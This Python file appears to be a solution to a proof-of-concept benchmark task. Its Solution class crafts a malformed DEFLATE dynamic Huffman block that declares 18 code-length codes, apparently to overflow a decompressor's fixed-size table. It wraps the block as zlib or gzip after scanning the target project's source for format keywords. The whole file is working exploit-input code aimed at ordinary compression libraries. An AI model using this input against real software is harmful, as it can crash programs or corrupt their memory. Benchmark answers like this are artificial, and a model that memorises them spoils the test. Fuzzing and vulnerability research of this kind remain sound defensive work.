import os
import tarfile
import binascii
from typing import List, Tuple, Optional


class _BitWriterLSB:
    __slots__ = ("_buf", "_bitbuf", "_bitcount")

    def __init__(self):
        self._buf = bytearray()
        self._bitbuf = 0
        self._bitcount = 0

    def write_bits(self, val: int, nbits: int) -> None:
        while nbits > 0:
            take = 8 - self._bitcount
            if take > nbits:
                take = nbits
            mask = (1 << take) - 1
            self._bitbuf |= (val & mask) << self._bitcount
            self._bitcount += take
            val >>= take
            nbits -= take
            if self._bitcount == 8:
                self._buf.append(self._bitbuf & 0xFF)
                self._bitbuf = 0
                self._bitcount = 0

    def byte_align_zero_pad(self) -> None:
        if self._bitcount:
            self._buf.append(self._bitbuf & 0xFF)
            self._bitbuf = 0
            self._bitcount = 0

    def get_bytes(self) -> bytes:
        self.byte_align_zero_pad()
        return bytes(self._buf)


def _make_deflate_dynamic_overflow_stream() -> bytes:
    # Dynamic Huffman block, crafted so that HCLEN+4=18 (>15) and still valid.
    # Output is empty (EOB immediately).
    #
    # BFINAL=1, BTYPE=2
    # HLIT=0 (257)
    # HDIST=1 (2 distance codes)
    # HCLEN=14 (18 code length code lengths)
    #
    # Code length alphabet lengths (18 entries in specified order):
    # order: [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1]
    # Set: sym0 len=1, sym1 len=2, sym18 len=2, others 0
    #
    # Then encode lit/len lengths: [1, 18x138 zeros, 18x117 zeros, 1]
    # and dist lengths: [1, 1]
    #
    # Then EOB using lit/len tree with sym0 and sym256 length 1 => EOB code is 1 bit '1'

    bw = _BitWriterLSB()

    bw.write_bits(1, 1)          # BFINAL
    bw.write_bits(2, 2)          # BTYPE=2 (dynamic), LSB-first emits 0,1
    bw.write_bits(0, 5)          # HLIT
    bw.write_bits(1, 5)          # HDIST (2 codes)
    bw.write_bits(14, 4)         # HCLEN (18 code length codes)

    # 18 code length code lengths in the specified order:
    clen = [0, 0, 2, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2]
    for v in clen:
        bw.write_bits(v, 3)

    # Code length Huffman codes (canonical):
    # sym0 len1 => code 0 (1 bit)
    # sym1 len2 => code 10 (2 bits) => LSB-first bits: 0,1 => val 0b10
    # sym18 len2 => code 11 (2 bits) => LSB-first bits: 1,1 => val 0b11
    def write_cl_sym(sym: int) -> None:
        if sym == 0:
            bw.write_bits(0b0, 1)
        elif sym == 1:
            bw.write_bits(0b10, 2)
        elif sym == 18:
            bw.write_bits(0b11, 2)
        else:
            raise ValueError("unexpected symbol")

    # Literal/length lengths (257):
    write_cl_sym(1)              # code 0 length 1
    write_cl_sym(18)             # repeat 138 zeros
    bw.write_bits(138 - 11, 7)
    write_cl_sym(18)             # repeat 117 zeros
    bw.write_bits(117 - 11, 7)
    write_cl_sym(1)              # code 256 length 1

    # Distance lengths (2):
    write_cl_sym(1)              # dist0 length 1
    write_cl_sym(1)              # dist1 length 1

    # Data: EOB (256) with 1-bit code '1'
    bw.write_bits(1, 1)

    return bw.get_bytes()


def _wrap_zlib(raw_deflate: bytes, uncompressed: bytes) -> bytes:
    # zlib header: CMF=0x78 (32K window, deflate), FLG=0x01 (check bits ok, no dict)
    hdr = b"\x78\x01"
    ad = binascii.adler32(uncompressed) & 0xFFFFFFFF
    tail = ad.to_bytes(4, "big")
    return hdr + raw_deflate + tail


def _wrap_gzip(raw_deflate: bytes, uncompressed: bytes) -> bytes:
    # Minimal gzip header + deflate + footer (CRC32, ISIZE)
    hdr = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff"
    crc = binascii.crc32(uncompressed) & 0xFFFFFFFF
    isize = (len(uncompressed) & 0xFFFFFFFF)
    tail = crc.to_bytes(4, "little") + isize.to_bytes(4, "little")
    return hdr + raw_deflate + tail


def _collect_source_texts(src_path: str, max_file_size: int = 2_000_000, max_total: int = 12_000_000) -> List[Tuple[str, str]]:
    texts: List[Tuple[str, str]] = []
    total = 0

    def add(name: str, data: bytes) -> None:
        nonlocal total
        if total >= max_total:
            return
        if len(data) > max_file_size:
            return
        try:
            s = data.decode("utf-8", "ignore")
        except Exception:
            s = data.decode("latin-1", "ignore")
        if not s:
            return
        total += len(s)
        texts.append((name, s))

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                if not os.path.isfile(p) or st.st_size <= 0 or st.st_size > max_file_size:
                    continue
                low = fn.lower()
                if not (low.endswith((".c", ".h", ".cc", ".cpp", ".hpp", ".hh", ".mk", "makefile", ".in", ".txt", ".md")) or "makefile" in low):
                    continue
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                except Exception:
                    continue
                add(p, data)
                if total >= max_total:
                    break
            if total >= max_total:
                break
        return texts

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if total >= max_total:
                    break
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_file_size:
                    continue
                name = m.name
                low = name.lower()
                if not (low.endswith((".c", ".h", ".cc", ".cpp", ".hpp", ".hh", ".mk", ".in", ".txt", ".md")) or low.endswith("makefile") or "/makefile" in low):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                add(name, data)
    except Exception:
        pass

    return texts


def _detect_input_format(src_path: str) -> str:
    texts = _collect_source_texts(src_path)
    score_gzip = 0
    score_zlib = 0
    score_png = 0
    score_raw = 0

    for name, s in texts:
        low = s.lower()
        lname = name.lower()

        if "llvmfuzzertestoneinput" in low:
            score_raw += 2

        if "gzip" in low or "gunzip" in low or "gzopen" in low or "gzread" in low or "gzwrite" in low:
            score_gzip += 4
        if "crc32" in low:
            score_gzip += 2
        if "0x1f" in low and "0x8b" in low:
            score_gzip += 3
        if "1f 8b" in low:
            score_gzip += 3

        if "zlib" in low or "adler32" in low:
            score_zlib += 4
        if "cmf" in low and "flg" in low:
            score_zlib += 2
        if "\\x78\\x9c" in low or "0x78" in low:
            score_zlib += 1

        if "png" in low or "ihdr" in low or "idat" in low:
            score_png += 1
        if "png" in lname or "upng" in lname:
            score_png += 1

        if "inflate" in low and ("zlib" not in low and "adler32" not in low and "gzip" not in low and "crc32" not in low):
            score_raw += 1

    # Prefer explicit wrappers if clearly present.
    if score_gzip >= max(score_zlib, score_raw) + 2:
        return "gzip"
    if score_zlib >= max(score_gzip, score_raw) + 1:
        return "zlib"
    if score_png >= max(score_gzip, score_zlib, score_raw) + 3:
        # Unlikely for this task, but keep fallback.
        return "png"
    if score_raw > 0 and score_raw >= max(score_gzip, score_zlib) + 1:
        return "raw"

    # Default guess
    return "zlib"


class Solution:
    def solve(self, src_path: str) -> bytes:
        raw_deflate = _make_deflate_dynamic_overflow_stream()
        uncompressed = b""

        fmt = _detect_input_format(src_path)
        if fmt == "gzip":
            return _wrap_gzip(raw_deflate, uncompressed)
        if fmt == "raw":
            return raw_deflate
        # Default to zlib
        return _wrap_zlib(raw_deflate, uncompressed)